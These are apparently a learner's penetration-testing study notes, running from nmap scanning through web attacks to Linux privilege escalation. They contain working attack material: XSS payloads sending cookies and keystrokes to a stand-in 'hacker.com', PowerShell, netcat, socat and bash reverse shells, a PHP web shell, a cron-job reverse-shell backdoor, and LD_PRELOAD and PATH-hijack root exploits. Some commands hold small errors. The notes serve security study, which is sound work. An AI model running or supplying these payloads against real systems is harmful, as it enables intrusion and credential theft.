
# VAPT Learning Notes – Table of Contents

This repository documents my hands-on learning and notes in Vulnerability Assessment and Penetration Testing (VAPT).

## Contents Overview

### PHASE 0: Fundamentals
- What is Cybersecurity
- CIA Triad
- VAPT Basics (VA vs PT)
- Threat, Vulnerability, Risk
- Ethics and Legal Scope
- Attacker Mindset
- Linux Basics for Pentesting
- Windows Basics
- Networking Basics
- Web Basics

---

### PHASE 1: Reconnaissance
- Passive Reconnaissance
- Active Reconnaissance

---

### PHASE 2: Network Scanning & Enumeration
- Network Protocols and Services
  - Telnet
  - HTTP
  - FTP
  - SMTP
  - POP3
  - IMAP
  - Cleartext Protocol Risks
- Nmap
  - Live Host Discovery
  - Port Scanning Techniques
  - TCP Scan Types
  - UDP Scanning
  - Scan Fine-Tuning
  - Spoofing and Decoys
  - Fragmented Packets
  - Service Detection
  - OS Detection and Traceroute

---

### PHASE 3: Network Attacks
- Sniffing Attacks
  - Tcpdump
  - Wireshark
  - Tshark
  - Mitigation Using TLS
- Man-in-the-Middle (MITM) Attacks
  - ARP Poisoning
  - Common Tools
  - Cryptographic Mitigations
- TLS / SSL
  - OSI Layer Placement
  - TLS Handshake Process
  - Certificate Authorities
  - Protocol Upgrades
  - MITM Protection
- Secure Shell (SSH)
  - Secure Remote Administration
  - Authentication
  - Secure File Transfer (SCP)

---

### PHASE 4: Web Application Testing
- Burp Suite
  - Proxy
  - Repeater
  - Intruder
  - Decoder
  - Comparer
  - Sequencer
  - Extensions
- File Inclusion
  - Path Traversal
  - Common OS File Locations (Linux & Windows)
  - Null Byte Injection (LFI)
- Cross-Site Scripting (XSS)
  - Basic Proof of Concept Payloads
  - Session Stealing
  - Keylogging
  - Input Escaping Techniques
  - Filter Bypass Payloads
  - XSS Polyglots
- SQL Injection (SQLi)
  - Blind SQL Injection Concepts
  - Boolean-Based Blind SQLi
    - Database Enumeration
    - Table Enumeration
    - Column Enumeration
    - Username & Password Enumeration
  - Time-Based Blind SQLi

---

### PHASE 5: Initial Access & Exploitation
- Password Attacks
  - Hydra Usage
  - Defensive Measures
- Reverse and Bind Shells
  - Reverse Shells
  - Bind Shells
  - Linux Targets
  - Windows Targets
  - Encrypted Shells (OpenSSL)
- Netcat Shells
  - Linux Reverse Shell
  - Linux Bind Shell
  - Windows Reverse Shell
- Web Shells
  - PHP Web Shells
  - Remote Command Execution
  - Windows PowerShell Payload Usage

---

### PHASE 6: Vulnerability Research & Frameworks
- Vulnerability Databases
  - Common Vulnerabilities
  - Exploit-DB
- Metasploit Framework
  - Components
  - Modules
  - Payload Types
  - msfconsole
  - Meterpreter
  - MsfVenom
  - Multi/Handler

  ---

### PHASE 7: Linux Privilege Escalation
- Enumeration
- Privilege Escaltion: Kernel Exploits
- Privilege Escalation: Sudo
- Privilege Escaltion: SUID
- Privilege Escalation: Capabilities
- Privilege Escalation: Cron Jobs
- Privilege Escalation: PATH
- Privilege Escalation: NFS
- Tools

---

### PHASE 8: Windows Privilege Escalation
- Harvesting Password from usual spot
- Other Quick Wins
- Abusing Service Misconfigurations
- Abusing Dangerous Privileges
- Abusing Vulnerable Software
- Tools

  

---

# FUNDAMENTALS 

## What is Cybersecurity

Cybersecurity is about protecting systems, networks, and data from attacks. That’s it.  
Attackers usually want to do one of three things: steal data, change data, or stop services from working.

As a pentester, my job is to think like an attacker and find where things can break.

## CIA Triad

This is the base of everything:

- Confidentiality: data should not be seen by random people
  
- Integrity: data should not be modified without permission
  
- Availability: systems should be up and usable

Almost every attack breaks at least one of these.

## VAPT Basics

- Vulnerability Assessment is about finding weaknesses.
  
- Penetration Testing is about exploiting those weaknesses.

VA tells *what is wrong*.  
PT shows *how bad it can get*.

## Threat, Vulnerability, Risk

- Threat: something that can cause harm (attacker, malware, misconfig)
  
- Vulnerability: a weakness in the system
  
- Risk: when a threat can actually exploit a vulnerability and cause damage

A vulnerability alone is not always dangerous unless it can be abused.

## Ethics and Legal Scope

Pentesting is only legal when you have permission.  

No permission = illegal.

We need to always follow scope and rules of engagement.

## Attacker Mindset

Attacker shoudl always think like this:

- What is exposed?
  
- What can I access?
  
- What is misconfigured?
  
- Can small issues be chained together?

Big hacks usually start from small mistakes.

## Linux Basics

Most pentesting tools run on Linux.  

Important things to know:

- File system like /etc, /var, /tmp
  
- Permissions (rwx, sudo, root)
  
- Processes and services

If Linux basics are weak, exploitation becomes painful.

## Windows Basics

Windows is very common in real environments.

Things that matter:

- Users and groups
  
- Services
  
- Registry
  
- PowerShell basics

Many privilege escalation paths exist because of bad Windows configs.

## Networking Basics

Before attacking networks, we should understand them:

- IP addresses
  
- Ports
  
- Services
  
- TCP vs UDP
  
- DNS

Most attacks start by scanning ports and services.

## Web Basics

Web vulnerabilities only make sense if web basics are clear:

- HTTP request and response
  
- GET and POST
  
- Cookies and sessions
  
- Authentication vs authorization

Without this, XSS and SQLi won’t fully click.

# Reconnaissance:

- Passive Reconnaissance: whois, nslookup, dig, shodan.io
  
- Active Reconnaissance: ping, traceroute, telnet, nc

# NETWORK SCANNING AND ENUMERATION

# Protocols and Servers:

- Telnet (connects to a virtual terminal of another computer) default port - 23
  
		$ telnet MACHINE_IP

 - HTTP (HyperText Transfer Protocol) default port - 80, transfers web pages like HTML pages and images.
 
		$ telnet MACHINE_IP 80

		$ host:telnet

		$ GET /index.html HTTP/1.1

- FTP (File Transfer Protocol) default port - 21
  
		$ ftp MACHINE_IP
  
		$ Name: ****
  
		$ Password: ****
  
		ftp> ls
  
		ftp> ascii
  
		ftp> get something.txt
  
		ftp> exit

- SMTP (Simple Mail Transfer Protocol) default port - 25
  
   	 - Components: Mail Submission Agent(MSA), Maile Transfer Agent(MTA), Mail Delivery Agent(MDA) and Mail User Agent (MUA)
  
   	 - MUA -> MSA -> MTA -> MDA -> MUA
  
			$ telnet MACHINE_IP 25
  
			$ helo telnet
  
			$ mail from: <address>
  
			$ rctp to: <addres>
  
			data: something
  
			$ quit


- POP3 (Post Office Protocol 3): used to download the email from MDA server. default port - 110
  
		$ telnet MACHINE_IP 110
  
		$ USER ****
  
		$ PASS ****
  
		$ STAT
  
		$ LIST
  
		$ RETR 1 (retrive the first message on the list)
  
		$ QUIT
  
		-> Disadvantage: mailboxes are not synchronized like read and unread messages.

- IMAP (Internet Message Access Protocol): keeps email synchronized across multiple devices. default port - 143
  
		$ telnet MACHINE_IP 143
  
		$ c1 LOGIN username password
  
		$ c2 LIST "" "*"
  
		$ c3 EXAMINE BOX
  
		$ c4 LOGOUT

** All of these protocols uses cleartext so anyone watching the network traffic would know the user's credential.

## Nmap Live Host Discovery:

	$ nmap -sn TARGETS
	
	$ nmap -PR -sn TARGET/24 (ARP scan on the same subnet)
	
	$ nmap -PE -sn MACHINE_IP/24 (ICMP echo)
	
	$ nmap -PP -sn MACHINE_IP/24 (ICMP Timestamp)
	
	$ nmap -PM -sn MACHINE_IP/24 (ICMP Address Mask)
	
	$ nmap -PS -sn MACHINE_IP/24 (TCP SYNchronize)
	
	$ sudo nmap -PA -sn MACHINE_IP/24 (TCP ACKnowledge)
	
	$ sudo nmap -PU -sn 10.10.68.220/24 (UDP)
	
	$ --dns-servers DNS_SERVER (Reverse-DNS Lookup)

## Nmap Port Scanning:

- TCP flags:
  
  - TCP header = 24 bytes of a TCP segment
  
    - First row (Source port number and Destination Port number) each allocating 16 bits (2 bytes)
  
    - Second row is Sequence number and third row is Acknowledgement Number
  
    - Total six rows. Each row contains 32 bit (4 bytes) so total 6 rows equals to 24 bytes
  
    	- TCP Header Flags:
  
       		- URG : urgent flag first priority to be processed
  
       		- ACK: acknowledge the receipt of a TCP segment
  
       		- PSH: push flag asking TCP to pass the data to the applicatioh
  
     		- RST: Reset flag used to reset the connection
  
       		- SYN: Synchronize flag used to initiate a TCP 3-way handshake and synchronize sequence numbers
  
       		- FIN: Finish flag meaning the sender has no more data to send
        
- TCP Connect Scan:
  
		$ nmap -sT MACHINE_IP

- TCP SYN Scan:

		$ sudo nmap -sS MACHINE_IP (does not need to complete a TCP 3-way handshake)

- Other TCP scans:
  
	- -sN (null), -sF (fin), -sX (Xmas)
  
  	- -sM (Maimon scan)
  
  	- -sA (ACK scan)

- UDP Scan:
  
		$ sudo nmap -sU MACHINE_IP 

- Fine-Tuning:
  
  - -p<1-50> (set ranges), -F (100 most common ports), -T<0-5> (controlling scan timing), --min-rate<number> and --max-rate<number>
    
- Spoofing and Decoys:
  
		$ nmap -S SPOOFED_IP MACHINE_IP (spoofed ip)
  
		$ nmap -D 10.10.0.1,10.10.0.2,RND,RND,ME MACHINE_IP (Decoy)
  
 	 - 3rd and 4th is randomly generated while fifth is the attacker.
  
     - Advantages:  make the scan look like coming from multiple IPs so the attacker's IP would be lost.

- Fragmented Packets:
  
		$ sudo nmap -sS -p80 -f MACHINE_IP
  
 	 - The 24 bytes of TCP header will be divided into multiple bytes of 8.
  
  	 - So, adding another -ff will fragment the data into multiples of 16, first will get 16 bytes and thhe remaing will get the 8 bytes of the TCP header.
    
- Service Detection:
  
		$ sudo nmap -sV MACHINE_IP
  
  - grabs service banner and bersion info

- OS Detection and Traceroute:
  
		$ sudo nmap -sS -O MACHINE_IP
  
  - OS details
  
		$ sudo nmap -sS --traceroute MACHINE_IP

 - finding routers between attacker and the target

# NETWORKS ATTACKS

## Sniffing Attack:

- tools: Tcpdump, Wireshark, Tshark
  
- Using tcpdump:
  
		$ sudo tcpdump port 110 -A (requires access to the network traffic)
  
  - here POP3 packets are being captured. -A means we want it in ASCII format
  
  - Solution: Adding an encryption layer on top of any network protocol. Particularly, Transport Layer Security (TLS).
    
## Man-in-the-middle (MITM) attack:

- tools: bettercap, ettercap -> effects cleartext protocols like FTP,SMTP and POP3.
  
- commonly attained by ARP poisoning on the same network subnet and capturing network traffic and all the cleartext protocols information.
  
- Solution: use of cryptography like Public Key Infrastructure(PKI) and trusted root certificates (which is TLS).

## Transport Layer Security (TLS)/ Secure Sockets Layer (SSL):

- Falls under the Presentation layer of the OSI model. So, data will be shown in an encrypted format (ciphertext) instead of its original form.
  
- Expect all servers to use TLS instead of SSL.
  
- After this layer the cleartext protocols and servers upgrades to HTTPS (443), FTPS (990), SMPTS (465), POP3S (995), IMAPS (993).
  
- ClientHello (sends to the server) -> ServerHello, Certificate*, ServerKeyExchange*, CertificateRequest*, ServerHelloDone (server provides required paramters to be trustworhty) -> Certificate*, ClientKeyExchange, [ChangeCipherSpec], Finished (client responds with its key and other information to generate the master key then proceeds to use encryption for communication with the server -> [ChangeCipherSpec], Finished (server also switches to encryption and informs the client)
  
- Public Certificates used by servers are signed by certificate authorities (CA) trusted by our systems.
  
- MITM attack. Safe

## Secure Shell (SSH):
- Created to provide a secure way for remote system administration.
  
- Also uses cryptography
  
- SSH server (p22) and client required.
  
- Authenticate using username and password.
  
		$ ssh nischal@MACHINE_IP
  
		$ nischal@MACHINE_IP's password: helloworld
  
- Secure Copuy protocol can also be used to copy files from the server.
  
		$ scp document.txt nischal@MACHINE_IP:/home/nischal
  
		$ nischal@MACHINE_IP's password:
  
		$ document.txt

# WEB APPLICATION TESTING

## Burp Suite:

- Proxy (enables interception and modification of requests and responses)
  
- Reapeater (captures, modifies and resends the captured request multiple time) -- Useful for crafting SQLi payloads.
  
- Intruder ( allows for spraying endpoints with requests) -- used for brute-force attacks or fuzzing endpoints.
  
- Decoder (data transformation) -- decode or encode payloads before sending.
  
- Comparer (compares two pieces of captured data at word or byte level)
  
- Sequencer (used when assessing randomly generated data such as session cookie values)
  
- Also has extensions to enhance the framework's functionality.

## File Inclusion:

- Path Traversal:
  
		$ http://webapp.com/get.php?file=../../../../boot.ini
  
		$ http://webapp.org/get.php?file=../../../../windows/win.ini

- Common OS files location:
  
		/etc/issue
  
		/etc/profile
  
		/proc/version
  
		/etc/passwd
  
		/etc/shadow
  
		/root/.bash_history
  
		/var/log/dmessage
  
		/var/mail/root
  
		/var/log/dmessage (has global system messages)
  
		/var/mail/root
  
		/var/log/apache2/access.log ( has accessed requests for Apache web server)
  
		C:\boot.ini
  
		/root/.ssh/id_rsa (private SSH keys)

- Null Byte Usage (local file inclusion):
  
		payload: include("languages/../../../../../etc/passwd%00").".php");

## XSS Payloads:

	$ <script>alert('hello');</script> (POC)
	
	$ <script>fetch('https://hacker.com/steal?cookie=' + btoa(document.cookie));</script> (session stealing)
	
	$ <script>document.onkeypress = function(e) { fetch('https://hacker.com/log?key=' + btoa(e.key) );}</script>
	(keylogger)
	
	$ "><script>alert('sup');</script> (escaping input tag)
	
	$ </textarea><script>alert('yoh');</script> (escaping textarea) 
	
	$ <sscriptcript>alert('THM');</sscriptcript> (bypassing filters)
	
	$ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('hi!')//>\x3e (XSS polyglots all in one type sh)

# SQLi Payloads:

- Blind SQLi:
  
		$ select * from users where username='%username%' and password='%password%' LIMIT 1;
  
- Boolean Based Blind SQLi:
  
		$ select * from users where username = '%username%' LIMIT 1;
  
		$ username UNION SELECT 1;--

  (saerching number of columns in the user's table)
  
		$ username UNION SELECT 1,2,3;--

  (finding the path to the actual column)
  
		$ username UNION SELECT 1,2,3 where database() like '%';--

  (enumeration of the database)
			- cycle all the keys on the keyboars in the "like" operator such as 'a%' then another time 'b%' until the string matches the first letter of the database name. After finding the first letter do it until we find the database full name.
  
		$ username UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'something' and table_name like 'a%';--
    (enumeration of table name)
			- using infromation_schema database to find the table name just like we found the databse name using "like" operator.
  
		$ admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='something' and TABLE_NAME='something' and COLUMN_NAME like 'a%';

   (enumerating column name)
  
		$ admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='something' and TABLE_NAME='something' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';

   (preventing the discovery of the same column twice)
  
		$ username UNION SELECT 1,2,3 from users where username like 'a%

  (enumeration of username)
  
		$ username UNION SELECT 1,2,3 from users where username='something' and password like 'a%

  (enumerating password)

- Time Based Blind SQLi:
  
		$ username UNION SELECT SLEEP(5);--

  (if there is pause to the response, it worked otherwise it failed)
  
		$ username UNION SELECT SLEEP(5),2;--

  (adding another column until the response time is 5 seconds)

# INITIAL ACCESS AND EXPLOITATION

## Password Attack:

- tool: Hydra (all methods related to HTTP)
  
		$ hydra -l username -P wordlist.txt MACHINE_IP service
  
- Solution:

    - make user to have a strong password
  
    - account lockout after certain number of failed attempts
  
    - use of CAPTCHA
  
    - Two-factor Auth
  
    - established knowledge about the user such as IP-based geolocation


## Reverse and Bind Shell:

- Reverse shell is a shell we as an attacker would get by forcing the target to execute a code that would connect back to our computer. We need to have a listener ready in our computer to receive such connection.

- Bind shell is a shell where the executed code on the target machine will open up a listerner and brodacast the port to the internet which we as an attacker can connect back to using the IP of the target machine and the port they opened to obtain Remote Code Execution.

  ## SOCAT COMMANDS:

- Reverse Shell:
  
		$ socat TCP-L:<port> -
  
- for windows to connect back:
  
		$ socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
  
	- The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.
  
- for linux to connect back:
  
		$ socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"

- Bind Shell
  
		$ socat TCP-L:<PORT> EXEC:"bash -li" (Target=Linux)
  
		$ socat TCP-L:<PORT> EXEC:powershell.exe,pipes (Target=Windows)
  
		$ socat TCP:<TARGET-IP>:<TARGET-PORT> - (on the attacking machine applicable for both targets)

- Linux Target only:
  
		$ socat TCP-L:<port> FILE:`tty`,raw,echo=0 (attacker)
  
		$ socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane (target)

## SOCAT encrypted Shells:

	$ openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt (generates a SSL certificate)

	$ cat shell.key shell.crt > shell.pem (merge the created files in .pem file)

- Reverse Shell:
  
		$ socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 - (attacker)
  
		$ socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash (target)
	
- Bind Shell:
  
		$ socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes (target)
  
		$ socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 - (attacker)
	
## FOR LINUX:

- Here we used Netcat, but instead of netcat command we can also use socat here as it gives more freedom to achieve goals. Below is a simple demostration of using netcat listener.
  
- Reverse Shell:
  
		$ mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f (target)
  - creating a named pipe at /tmp/f which gets piped into the /sh.

- Bind Shell:
  
		$ mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f (target)

## FOR WINDOWS:

		$ powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"  (target)
		
 (Useful one-liner PSH Reverse Shell to get powershell on windows)

## Webshells:

	$ <?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?> 
	
(basic one line format) 
	
- RCE is normally gained in linux, but for Windows we need to copy this into the URL as the cmd argument:
  
		$ powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22

# VULNERABILITIES RESEARCH AND FRAMEWORKS

- Scoring Vulnerabilites:

 	- CVSS (Common Vulnerability Scoring System)

 	- VPR (Vulnerability Priority Rating)

- Vulnerability Databases:

  - NVD (National Vulnerability) - CVE - YEAR - IDNUMBER

  - Exploit-DB - POC for exploitation to exploit specific vulnerability

- Automated vs Manual Vulnerability Research:

 	- Nessus (primarily used for automated vulnerability research)

  	- Metasploit ( auxiliary module for scanning known signatures of a vulnerability)

- Common Vulnerabilites:

  - Security Misconfigurations

  - Broken Access Control

  - Insecure Deserialization

  - Injection

## Metasploit:

- Main Components:

	- msfconsole

	- Modules

  	- Tools

  	- Vulnerability, Exploit, Payload

- Modules:

  - Auxiliary : Scanners, crawlers and fuzzers.

  - Encoders : encode the exploit and payload to bypass signature-based antivirus solution.

  - Evasion : will try to evade the antivirus with more or less success.

  - Exploits : a piece of code which uses a vulnerability present on the target system.

  - NOPs : No OPeration do nothing. Used as buffer to achieve consistent payload size.

  - Payloads : code that runs on the target system. Needed to achieve results on the target such as getting a shell, loading malware or backdoor.

  - Post : final stage of penetration testing, post-exploitation.

- Types of Payloads:

  - Adapters: Wraps single payloads to convert them into different formats.

  - Singles: Self-contained payloads

  - Stagers: Sets up a connection channel between Metasploit and the target system.

  - Stages: Downloaded by the stager after setting the stage by uploading a stager to the target system. The final payload sent will be relatively large than the first one.

- Single vs Staged Payloads:

  - generic/shell_reverse_tcp (inline/single)

  - windows/x64/shell/reverse_tcp (staged)

- msfconsole:

  		> search type:exploit windows ms17-010

   		> use *

  (any exploit you want to use based on the known vulnerability)

		> info

 		> show options

 		> set PARAMETER_NAME VALUE

  		> show payloads

  		> setg / unsetg

  (set or unset the global variable)

  		> exploit/run

   		> exploit -z

  (runs the exploit and background the session)

		> sessions

   (checks active sessions)

 		> session -i ID

  (interact with the desired session)

## Meterpreter:

-  a Metasploit payload which is basically a post-exploitation tool after obtaining a meterpreter shell of the target machine
 
- runs in the memory of the target machine so it is hard to be detected during antivirus scans.
 
- uses encrypted communications with the server where Metasploit runs.
 
- Commands (meterpreter):

  		> msfvenom --list payloads | grep meterpreter

  (depends which one to use by analyzing target operating system, components and the network connection type)

  		> getpid

   		> ps

		> help

 		> search -f document.txt

 		> background, exit, guid, info, migrate, run, load and many more

## MsfVenom:

- used to access all payloads available in the framework and allows to create payloads in different format to the attacker need or the vulnerable machine.

		$ msfvenom -l payloads

		$ msfvenom -p <PAYLOAD> <OPTIONS>
	
		$ msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
	       				 {<OS>/<arch>/<payload>}
			
		$ shell_reverse_tcp

   (stageless payload)
	
		$ shell/reverse_tcp

   (staged payload)
	
		$ metasploit multi/handler

  (used for staged payload)

## Multi Handler:

- used to receive incoming connection.

  		> use exploit/multi/handler

   		> show options

   (change what needs to be changed)

		> set LHOST ATTACKIN_MACHINE_IP LPORT USED WHEN IN MSFVENOM PAYLOAD

  		> set payload USED IN MSFVENOM PAYLOAD

		> run

- Use of MsfVenom and Multihandler:

  - create customised payload of an exploit and give permission to the file to be edited (chmod +x)
    
  - host a python server on the attacking machine
    
    	$ python3 -m http.server 9000/shell.elf
  
  - use the compromised target machine to download the files from the python web server

		$ wget http://ATTACKING_MACHINE_IP:9000/shell.elf

		$ chmod +x shell.elf

		$ ./shell.elf

	- now what the multi handler does is capture the payload msfVenom created and the one target machine just executed and automatically loads a meterpreter shell on the msfconsole.
 
  	- this staged payload requires different tabs to be open, one for connecting to the target machine using ssh or any known methods, two for msfvenom to generate payload and host a python server and third one to listen to the upcoming payload that msfvenom created that was ran on the target machine.

* This is for LINUX target machine. For windows also it is the same but the command to download the payload from the attacker server is different and downloadable executive of the file is also different.

# LINUX PRIVILEGE ESCALATION

- going from lower permission to a higher permission in LINUX target machine.

  - Enumeration:

	- Basic Commands

			$ hostname

			$ uname -a

			$ /proc/version

			$ /etc/issue

			$ ps

			$ env

			$ /etc/passwd

			$ cat /etc/passwd | cut -d ":" -f 1

			$ netstat-a,-at,-au,-l,-s,-i,-ano
 
  - Find Commands:

			$ find . -name nischal.txt

(find this file in the current directory)

			$ find /home -name nischal.txt 
			
(find file in home dir)

			$ find / -type d -name config
			
(dictory named config under"/")

			$ find / -type f -perm 0777 
			
(files with 777 permissions)

			$ find / -perm a=x 
			
(executable files)

			$ find /home -user nischal
			
(all files for user "nischal" under "/home"

			$ find / -mtime 10 
			
(modifies in the last 10 days)

			$ find / -atime 10 
			
(accessed in the past 10 days)

			$ find / -cmin -60 
			
(changed in the last 60 mins)

			$ find / -amin -60 
			
(accessed withing the last 60 mins)

			$ fine / -size 50M 
			
(with size of 50MB)

			$ find / -writable -type d 2>/dev/null 
			
(world-writable folder)

 (2>/dev/null redirects error to "/dev/null" so we can get cleaner output)

			$ find / -perm -333 -type d 2>/dev/null 
			
(world-writable folder)

			$ find / -perm -o x -type d 2>/dev/null
			
(world-executable folders)

			$ find / -name python* 
			
(supported languages)

			$ find / -perm -u=s -type f 2>dev/null 
			
(files with the SUID bit)
    		
  - finding this executing it in a proper way allows us to run file with a higher privilege than the current level we end up with while getting the linux shell


## Privilege Escalation: Kernel Exploits

- Identifying the kernel version

- Searching and finding the exploit code by researching the version of the target system

- Serving a web server to transfer the exploit to the target machine

- Downloading the exploit in the target machine (/tmd folder is usaully safe for this) and giving it executable permissions

- Compiling and executing

- Running the exploit

- Solution:

  	- Keeping checks on the kernel updates and patches to be safe from known vulnerabilites.

  	- Enforcing SELinux or AppArmor policies so it blocks unauthorized code execution. (for eg: preventing the execution of malicious code in common /tmp directories).

  	- Detecting aunauthorized use of gcc or other compilers by non-admin users.

## Privilege Escalation: Sudo

- Low level users do not have higher privileges to run programs with root privileges. So, because of some situations, system administrators might provide regular users some flexibility on their privileges. By checking the root privileges of a low level user, we can further escalate into the root user.

			$ sudo -l

   (checking the users root privileges)

  - Use of GTFObins to search for exploits and commands that could provide root access depending on the type of privilege user currently has.
 
  - Leveraging LD_PRELOAD: LD_PRELOAD is a function which allows any program to use shared libraries and we can find it within the context of checking root privileges in the field of 'env_keep'.

- Steps for escalating this function:

  	- Checking for LD_PRELOAD

	- Writing a simple C code which shhould be complied as a share object (.so extension)

	- running the program with sudo rights and the LD_PRELOAD option to the .so file

  				#include<stdio.h>
  
  				#include<sys/types.h>
  
  				#include<stdlib.h>
  
  
				void_init() {
  
  				unsetenv("LD_PRELOAD");
  
  				setgid(0);
  
  				setuid(0);
  
  				system("/bin/bash");
  				}
 
  	 (Save and Exit)

				$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles

  - Now we can find almost any program our user can run with sudo
 
    	$ sudo LD_PRELOAD=/home/nischal/ldpreload/shell.so find


## Privilege Escalation: SUID

- Files can have read, write and execute permissions. But, with SUID things are different, any files could be executed with the permission level of the file owner or the group owner. We could notice it with the "s" bit set showing their special permission.

  		$ find / -type f -perm -04000 -ls 2>/dev/null

  - SUID bit set for any low level commands such as nano, base64, e.t.c could result in the full compromise of the system beacuse we could further escalate the privilege by gaining access to the /etc/shadow file or simple exploiting the base64 read command for every files in the system.

- GTFObins is a reliable tool for using suchh exploits as well.

## Privilege Escalation:Capabilities

- Increasing the privilege level of a process or binary to help manage privileges at more granular level is "Capabilites". For example, a SOC analyst needs a tool to initiate socket connections which a regular user would not be able to do. So system administrators change the capabilites of the binary if they do not want to give them the privilege of a higher level user.

  		$ getcap -r / 2>/dev/null

- If we get a result such as: /home/nischal/vim = cap_setuid+ep, then we know that this capabilites has a SUID bit set. This privilege escalation vector is not discoverable when enumerating the file itself looking for SUID. So, once again we can check the GTFO bins to check the list of binaries that could be leveraged for privilege escaltion.

## Privilege Escaltion: Cron Jobs

- Cron jobs are mainly used for running scripts or binaries at specific times. If there is scheduled task that runs with root privileges then we can change the script that will be run at the time and run our script to escalate the privilege to the root. (By default they run with the privilege of their owners and not the current user)

  		$ cat /etc/crontab

  - So, if we see that a file "backup.sh" runs with the root privilege at a certain time say like every 5 minutes then we can modify this script to give us a shell with the root privilege.

  		$ nano backup.sh (assuming we found this script)

		#!/bin/bash

  		bash -i >& /dev/tcp/ATTACKER_IP/7777 0>&1

	 (Save and Exit)

- everything in this script needs to be changed with the command above. The goal here is to obtain a reverse shell in the attacking machine. Commands like 'nc' will not work in this case or it depends on the available tools.

  * reverse shells are always prefferable beacuse we do not want to compromise the system integrity during real penetration tesing engagement.

  - Then, we will run a listener on our attacking machine to receive the incoming connection.

  		$ nc -nlvp 7777

  - Assuming the script will run every five minutes, we should just wait until the script will run and we will get the reverse shell on our attacking machine with the root id.

- Crontab is worth checking beacuse of its easy privilege escaltion vectors.

- It is also worth to understand the function of the script and how any tool is used within the context such as tar,7z.rsync,e.t.c.

- Such type of scripts are usually left unchecked because of certain levels of understanding of such exploits by system administrators. So cleaning the relevant cron job after the script becomes useless is very important.

## Privilege Escaltion: PATH

- PATH in Linux is an environmental variable that commands the operating system where to search for executables. So, if a folder for which the compromised user has written permission to is lacated in the PATH, we could hijack an application to run a script.

- For any command that is not built into the shell or which is not defined with an absolute path, Linux will try to search it in folders defined under $PATH.

  		$ echo$PATH (see what is in the PATH)

- If we type nischal to the command line, then Linux will look for an executable called "nischal" in the PATH.

- Leveraging this environmental variable solely depends on the existing configuration of the target system. So, it is always a good idea to ask yourself these questions before trying to run a script:
 
  - Under $PATH, what folders are located?

	- Do the current user has write privileges for any of these folders?

	- Can you modify $PATH?

	- Is there a script/application you can start that will be affected by this vulnerability?

- We will be using a simple script for demo purpose to take advantage of this vulnerability
 
    		$ nano path.c

			#include<unistd.h>
    

			void main() {

			setuid(0);

			setgid(0);

			system("nischal");

			}

	- Here, the script tries to launch a system binary called "nischal", however we can use any binary here.

	- First, we need to compile this script into an executable and set the SUID bit.

			$ gcc path.c -o path -w

			$ chmod u+s path

			$ ls -l

   (should give the file "s" bit)

    - Once this gets executed, "path" will look for an executable name "nischal" inside folders listed under PATH

	- If any writable folder falls under PATH, then we can create a binary name "nischal" under that directory and have our "path" script run in it. AS we have set the SUID bit, the binary will run with root privilege.

			$ find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u

	- This command will search for writable files where we could write our script to.

	- After this we can compare it with the PATH to find folders we could use.

	- We could use /tmp directory beacuse it is used for temporary executable files and is a standard, shared space for transient data. It is easier to write folder also. So, if /tmp: is not in the $PATH variable then we could add it using:

				$ export PATH=/tmp:$PATH

	- At this point, the path script will also look under /tmp folder for an executable named "nischal". So the next thing we need to do is copying /bin/bash as "nischal" under this folder.

				$ cd /tmp

				$ echo "bin/bash" > nischal

				$ chmod 777 nischal

				$ ls -l nischal

	- We could see the executable "nischal" on this folder. So, now we need to go back to the directory where we created the "path" script where we set its SUID bit.

				$ ./path

				$ id

